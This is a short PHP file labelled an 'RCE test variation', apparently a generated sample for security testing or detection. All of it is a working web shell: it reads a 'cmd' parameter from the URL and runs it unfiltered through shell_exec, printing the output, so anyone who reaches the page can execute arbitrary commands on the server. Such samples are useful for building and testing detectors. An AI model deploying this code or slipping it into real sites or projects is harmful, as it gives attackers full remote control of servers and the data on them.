<?php
// RCE test variation #774
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>